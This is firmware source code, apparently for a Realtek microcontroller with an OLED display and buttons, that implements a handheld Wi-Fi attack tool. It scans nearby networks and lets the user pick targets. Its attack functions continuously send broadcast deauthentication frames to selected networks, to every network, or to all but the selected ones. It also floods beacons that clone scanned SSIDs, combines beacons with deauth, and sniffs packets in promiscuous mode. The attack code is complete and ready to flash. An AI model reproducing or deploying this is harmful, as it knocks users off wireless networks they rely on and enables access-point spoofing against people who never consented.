#include "WiFi.h"
#include "WiFiClient.h"
#include "WiFiServer.h"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_structures.h"
#include "wifi_util.h"

// DIVERSOS E SISTEMA
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "debug.h"
#include <algorithm>
#include <map>
#include <vector>
#include <Wire.h>

// DISPLAY
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// PINOS
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13

// VARIÁVEIS GLOBAIS
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
  bool isSelected;
} WiFiScanResult;


unsigned long prevTimeMon = 0;
uint32_t pktsMon = 0;
uint32_t deauthsMon = 0;
uint32_t noDeauths = 0;
uint32_t valMon[SCREEN_WIDTH] = {0};
uint8_t idxMon = 0;
uint32_t maxValMon = 1;
double multiplicatorMon = 1.0;
bool ssidLockedMon = false;
char ssidMon[33] = "Pkt:";

// Credenciais para a sua rede Wifi
const char *ssid = "littlehakr";
const char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
int menustate = 0;
int scrollindex = 0;
int perdeauth = 3;

// Variáveis de temporização
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// FUNÇÕES DE REDE E SCAN
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3],
             result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.isSelected = false;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    // Ordena por sinal: redes mais fortes primeiro (RSSI em dBm, maior = melhor)
    std::sort(scan_results.begin(), scan_results.end(),
              [](const WiFiScanResult &a, const WiFiScanResult &b) {
                return a.rssi > b.rssi;
              });
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

// FUNÇÕES DE TELA E INTERFACE
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

// Desenha uma caveira centrada em (cx, cy) usando primitivas do GFX.
// Fácil de reposicionar e sem custo de memória de um bitmap.
void drawSkull(int cx, int cy) {
  display.fillRoundRect(cx - 20, cy - 24, 40, 36, 12, WHITE); // crânio
  display.fillRoundRect(cx - 12, cy + 8, 24, 14, 4, WHITE);   // maxilar
  display.fillCircle(cx - 10, cy - 6, 7, BLACK);              // olho esq.
  display.fillCircle(cx + 10, cy - 6, 7, BLACK);              // olho dir.
  display.fillTriangle(cx, cy + 1, cx - 4, cy + 8, cx + 4, cy + 8,
                       BLACK); // nariz
  display.drawFastHLine(cx - 12, cy + 8, 24, BLACK); // linha da gengiva
  for (int i = -8; i <= 8; i += 4)
    display.drawFastVLine(cx + i, cy + 8, 14, BLACK); // dentes
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawMessageScreen(const char *line1, const char *line2) {
  display.clearDisplay();
  drawFrame();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(10, 25);
  display.println(line1);
  display.setCursor(10, 40);
  display.println(line2);
  display.display();
}

void drawMainMenu(int selectedIndex) {
  display.clearDisplay();
  drawFrame();
  const char *menuItems[] = {"Attack", "Scan", "Select", "Monitor"};
  for (int i = 0; i < 4; i++) {
    drawMenuItem(8 + (i * 13), menuItems[i], i == selectedIndex);
  }
  display.display();
}

// Conta quantas redes estão marcadas.
int countSelected() {
  int k = 0;
  for (size_t i = 0; i < scan_results.size(); i++)
    if (scan_results[i].isSelected)
      k++;
  return k;
}

// Linhas navegáveis da tela de seleção: N redes + Select All / Clear All / Back.
int multiSelectRowCount() { return (int)scan_results.size() + 3; }

// Monta o rótulo da linha 'index' (rede com RSSI/canal, ou uma das ações).
void multiSelectLabel(int index, char *buf, size_t bufLen) {
  int n = (int)scan_results.size();
  if (index < n) {
    const char *prefix = scan_results[index].isSelected ? "[x] " : "[ ] ";
    snprintf(buf, bufLen, "%s%-9.9s%4d/%u", prefix,
             scan_results[index].ssid.c_str(), scan_results[index].rssi,
             scan_results[index].channel);
  } else if (index == n) {
    snprintf(buf, bufLen, "   Select All");
  } else if (index == n + 1) {
    snprintf(buf, bufLen, "   Clear All");
  } else {
    snprintf(buf, bufLen, "<- Back (%d sel)", countSelected());
  }
}

void drawMultiSelectScreen(int scrollIndex) {
  display.clearDisplay();
  drawFrame();

  if (scan_results.empty()) {
    display.setCursor(10, 25);
    display.print("No networks found.");
    display.setCursor(10, 40);
    display.print("Scan first!");
    display.display();
    return;
  }

  int itemsPerPage = 4;
  int total = multiSelectRowCount();
  int start = (scrollIndex / itemsPerPage) * itemsPerPage;

  for (int i = 0; i < itemsPerPage; i++) {
    int currentIndex = start + i;
    if (currentIndex >= total)
      break;

    char lineBuffer[32];
    multiSelectLabel(currentIndex, lineBuffer, sizeof(lineBuffer));

    int yPos = 8 + (i * 13);
    if (currentIndex == scrollIndex) {
      display.fillRect(4, yPos - 3, SCREEN_WIDTH - 8, 11, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(8, yPos);
    display.print(lineBuffer);
    display.setTextColor(WHITE);
  }

  display.display();
}

void drawScanScreen() {
  display.clearDisplay();
  drawFrame();

  display.setTextSize(2);
  display.setCursor(35, 8);
  display.println("SCAN");
  display.setTextSize(1);

  static const char *frames[] = {"/", "-", "\\", "|"};
  for (int i = 0; i < 20; i++) {
    display.fillRect(4, 30, SCREEN_WIDTH - 8, 10, BLACK);
    display.setCursor(40, 30);
    display.print("Scanning ");
    display.print(frames[i % 4]);

    display.drawRect(20, 45, SCREEN_WIDTH - 40, 8, WHITE);
    display.fillRect(22, 47, (SCREEN_WIDTH - 44) * i / 19, 4, WHITE);
    display.display();
    delay(250);
  }
}

// FUNÇÕES DE ATAQUE
enum DeauthMode { ATK_SELECTED, ATK_ALL, ATK_ALL_BUT_SELECTED };

// Tela de ataque em andamento, redesenhada ao vivo.
// 'fail' conta frames recusados pelo driver (pool de TX esgotado): se esse
// número dispara, o envio "travou" mesmo com o laço ainda rodando.
void drawAttackRun(const char *title, uint32_t sent, uint32_t fail,
                   int channel) {
  display.clearDisplay();
  drawFrame();
  display.setTextColor(WHITE);
  display.setTextSize(2);
  display.setCursor(28, 6);
  display.println("ATTACK");
  display.setTextSize(1);
  display.setCursor(8, 26);
  display.print(title);
  display.setCursor(8, 38);
  display.print("TX:");
  display.print(sent);
  display.setCursor(8, 48);
  display.print("Fail:");
  display.print(fail);
  display.print(" Ch:");
  display.print(channel);
  display.display();
}

// Deauth unificado: marcadas (ATK_SELECTED), todas (ATK_ALL) ou todas menos
// as marcadas (ATK_ALL_BUT_SELECTED). O delay(1) por alvo dá folga ao driver
// para drenar a fila de TX, evitando o travamento silencioso do envio.
void runDeauthAttack(DeauthMode mode, const char *title) {
  uint8_t deauth_bssid[6];
  const uint16_t reasons[] = {1, 4, 16};
  uint32_t sent = 0, fail = 0;
  int lastChannel = current_channel;
  unsigned long lastUi = 0;

  drawAttackRun(title, 0, 0, lastChannel);

  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      if (mode == ATK_SELECTED && !scan_results[i].isSelected)
        continue;
      if (mode == ATK_ALL_BUT_SELECTED && scan_results[i].isSelected)
        continue;

      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      lastChannel = scan_results[i].channel;
      wext_set_channel(WLAN0_NAME, lastChannel);

      for (int x = 0; x < perdeauth; x++) {
        for (int r = 0; r < 3; r++) {
          if (wifi_tx_deauth_frame(
                  deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasons[r]))
            sent++;
          else
            fail++;
        }
      }
      delay(1); // yield: deixa o driver esvaziar a fila de TX
    }

    unsigned long now = millis();
    if (now - lastUi > 250) {
      lastUi = now;
      drawAttackRun(title, sent, fail, lastChannel);
    }
  }
}

void BeaconDeauth() {
  uint8_t deauth_bssid[6], becaon_bssid[6];
  uint32_t sent = 0, fail = 0;
  int lastChannel = current_channel;
  unsigned long lastUi = 0;

  drawAttackRun("Beacon+Deauth", 0, 0, lastChannel);

  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      const char *ssid1_cstr = scan_results[i].ssid.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      lastChannel = scan_results[i].channel;
      wext_set_channel(WLAN0_NAME, lastChannel);
      for (int x = 0; x < 10; x++) {
        if (wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                                 ssid1_cstr))
          sent++;
        else
          fail++;
        if (wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                                 0))
          sent++;
        else
          fail++;
      }
      delay(1); // yield: deixa o driver esvaziar a fila de TX
    }

    unsigned long now = millis();
    if (now - lastUi > 250) {
      lastUi = now;
      drawAttackRun("Beacon+Deauth", sent, fail, lastChannel);
    }
  }
}

void Beacon() {
  uint8_t becaon_bssid[6];
  uint32_t sent = 0, fail = 0;
  int lastChannel = current_channel;
  unsigned long lastUi = 0;

  drawAttackRun("Beacon Flood", 0, 0, lastChannel);

  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      const char *ssid1_cstr = scan_results[i].ssid.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      lastChannel = scan_results[i].channel;
      wext_set_channel(WLAN0_NAME, lastChannel);
      for (int x = 0; x < 10; x++) {
        if (wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                                 ssid1_cstr))
          sent++;
        else
          fail++;
      }
      delay(1); // yield: deixa o driver esvaziar a fila de TX
    }

    unsigned long now = millis();
    if (now - lastUi > 250) {
      lastUi = now;
      drawAttackRun("Beacon Flood", sent, fail, lastChannel);
    }
  }
}

void attackLoop() {
  int attackState = 0;
  bool running = true;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }
  while (running) {
    display.clearDisplay();
    drawFrame();
    const char *attackTypes[] = {"Selected Deauth", "All Deauth",
                                 "All but Sel.",    "Beacon",
                                 "Beacon+Deauth",   "Back"};
    const int itemCount = 6;
    const int backIndex = itemCount - 1;
    for (int i = 0; i < itemCount; i++) {
      drawMenuItem(6 + (i * 9), attackTypes[i], i == attackState);
    }
    display.display();
    if (digitalRead(BTN_OK) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (attackState == backIndex) {
        running = false;
      } else {
        switch (attackState) {
        case 0:
          runDeauthAttack(ATK_SELECTED, "Selected");
          break;
        case 1:
          runDeauthAttack(ATK_ALL, "All Networks");
          break;
        case 2:
          runDeauthAttack(ATK_ALL_BUT_SELECTED, "All but Sel.");
          break;
        case 3:
          Beacon();
          break;
        case 4:
          BeaconDeauth();
          break;
        }
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (attackState < backIndex)
        attackState++;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (attackState > 0)
        attackState--;
    }
  }
}

void networkMultiSelectionLoop() {
  bool running = true;
  scrollindex = 0;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }
  while (running) {
    drawMultiSelectScreen(scrollindex);
    int n = (int)scan_results.size();
    if (digitalRead(BTN_OK) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (scan_results.empty()) {
        running = false;
      } else if (scrollindex < n) {
        scan_results[scrollindex].isSelected =
            !scan_results[scrollindex].isSelected;
      } else if (scrollindex == n) { // Select All
        for (int i = 0; i < n; i++)
          scan_results[i].isSelected = true;
      } else if (scrollindex == n + 1) { // Clear All
        for (int i = 0; i < n; i++)
          scan_results[i].isSelected = false;
      } else { // Back
        running = false;
      }
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (scrollindex < multiSelectRowCount() - 1)
        scrollindex++;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (scrollindex > 0)
        scrollindex--;
    }
    delay(50);
  }
}

void snifferMon(unsigned char *buf, unsigned int len, void *userdata) {
  (void)len;
  (void)userdata;
  const uint8_t *payload = (const uint8_t *)buf;
  pktsMon++;

  if (payload[0] == 0xC0 || payload[0] == 0xA0)
    deauthsMon++;

  if (!ssidLockedMon && payload[0] == 0x80) {
    uint8_t lenSSI = payload[37];
    if (lenSSI > 0 && lenSSI < 33) {
      memcpy(ssidMon, &payload[38], lenSSI);
      ssidMon[lenSSI] = '\0';
      ssidLockedMon = true;
    }
  }
}

void monitorLoop() {
  while (digitalRead(BTN_OK) == LOW)
    ;
  wifi_set_promisc(1, snifferMon, 1);

  bool running = true;
  while (running) {
    unsigned long now = millis();

    if (digitalRead(BTN_UP) == LOW) {
      delay(DEBOUNCE_DELAY);
      current_channel = (current_channel < 13) ? current_channel + 1 : 1;
      wifi_set_channel(current_channel);
      memset(valMon, 0, sizeof(valMon));
      pktsMon = deauthsMon = 0;
      ssidLockedMon = false;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(DEBOUNCE_DELAY);
      current_channel = (current_channel > 1) ? current_channel - 1 : 13;
      wifi_set_channel(current_channel);
      memset(valMon, 0, sizeof(valMon));
      pktsMon = deauthsMon = 0;
      ssidLockedMon = false;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(DEBOUNCE_DELAY);
      running = false;
    }

    if (now - prevTimeMon >= 1000) {
      prevTimeMon = now;
      for (int i = 0; i < SCREEN_WIDTH - 1; i++)
        valMon[i] = valMon[i + 1];
      valMon[SCREEN_WIDTH - 1] = pktsMon;
      maxValMon = 1;
      for (int i = 0; i < SCREEN_WIDTH; i++)
        maxValMon = (valMon[i] > maxValMon) ? valMon[i] : maxValMon;

      multiplicatorMon = (maxValMon > (SCREEN_HEIGHT - 20))
                             ? double(SCREEN_HEIGHT - 20) / maxValMon
                             : 1.0;
      noDeauths = pktsMon - deauthsMon;
      display.clearDisplay();

      // Garante que o texto seja branco antes de desenhar.
      display.setTextColor(WHITE);

      display.setTextSize(1);
      display.setCursor(0, 0);
      char headerBuffer[40];
      snprintf(headerBuffer, sizeof(headerBuffer), "Ch:%d %s %lu",
               current_channel, ssidMon, noDeauths);
      display.print(headerBuffer);

      display.drawLine(0, 12, SCREEN_WIDTH - 1, 12, SSD1306_WHITE);
      for (int x = 0; x < SCREEN_WIDTH; x++) {
        int h = valMon[x] * multiplicatorMon;
        display.drawLine(x, SCREEN_HEIGHT - 1, x, SCREEN_HEIGHT - 1 - h,
                         SSD1306_WHITE);
      }
      display.display();
      pktsMon = deauthsMon = 0;
    }

    delay(10);
  }

  wifi_set_promisc(0, NULL, 0);
}

// SETUP E LOOP PRINCIPAL
void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);

  Serial.begin(115200);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }

  // Limpa a tela e desenha a splash screen (caveira centralizada)
  display.clearDisplay();
  drawSkull(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2);
  display.display();
  delay(3000);
  display.clearDisplay();

  DEBUG_SER_INIT();

  char chStr[4];
  snprintf(chStr, sizeof(chStr), "%d", current_channel);
  WiFi.apbegin((char*)ssid, (char*)pass, chStr);

  drawMessageScreen("    Starting...", "Scanning networks!");

  if (scanNetworks() != 0) {
    drawMessageScreen("Scan Failed!", "Please restart.");
    while (true)
      ;
  }

  for (int i = 0; i < SCREEN_WIDTH; i++)
    valMon[i] = 0;
  prevTimeMon = millis();
}

void loop() {
  unsigned long currentTime = millis();
  drawMainMenu(menustate);

  if (digitalRead(BTN_OK) == LOW &&
      (currentTime - lastOkTime > DEBOUNCE_DELAY)) {
    switch (menustate) {
    case 0:
      attackLoop();
      break;
    case 1:
      drawScanScreen();
      if (scanNetworks() == 0) {
        drawMessageScreen("  Scan Complete!", "");
        delay(1500);
      } else {
        drawMessageScreen("Scan Failed!", "Check console.");
        delay(2000);
      }
      break;
    case 2:
      networkMultiSelectionLoop();
      break;
    case 3:
      monitorLoop();
      break;
    }
    lastOkTime = currentTime;
  }

  if (digitalRead(BTN_DOWN) == LOW &&
      (currentTime - lastDownTime > DEBOUNCE_DELAY)) {
    if (menustate > 0)
      menustate--;
    else
      menustate = 3;
    display.invertDisplay(true);
    delay(50);
    display.invertDisplay(false);
    lastDownTime = currentTime;
  }

  if (digitalRead(BTN_UP) == LOW &&
      (currentTime - lastUpTime > DEBOUNCE_DELAY)) {
    if (menustate < 3)
      menustate++;
    else
      menustate = 0;
    display.invertDisplay(true);
    delay(50);
    display.invertDisplay(false);
    lastUpTime = currentTime;
  }
}
